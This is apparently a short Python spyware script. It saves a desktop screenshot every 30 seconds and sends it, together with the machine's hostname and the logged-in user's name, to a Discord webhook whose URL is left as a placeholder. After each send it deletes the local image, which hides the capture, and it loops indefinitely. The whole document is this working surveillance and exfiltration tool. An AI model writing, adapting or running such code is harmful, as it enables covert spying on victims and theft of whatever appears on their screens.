import pyautogui
import dhooks
import os
from time import sleep
import socket

def picfolder():
	if os.path.exists("C:\\pic\\"):
		main()
	else:
		os.mkdir("C:\\pic\\")

def screen():
	pic = pyautogui.screenshot()
	pic.save(r'C:\\pic\\screen.png')

def hooksend():
	hook = dhooks.Webhook('WEBHOOK HERE')
	ip = socket.gethostname()
	hostname = os.getlogin()
	file = dhooks.File('C:\\pic\\screen.png', name='sreen.png')
	hook.send(str(ip))
	hook.send(str(hostname))
	hook.send(file=file)

def cleaner():
	os.remove("C:\\pic\\screen.png")

def main():
	while True:
		sleep(30)
		screen()
		hooksend()
		cleaner()

picfolder()
main()
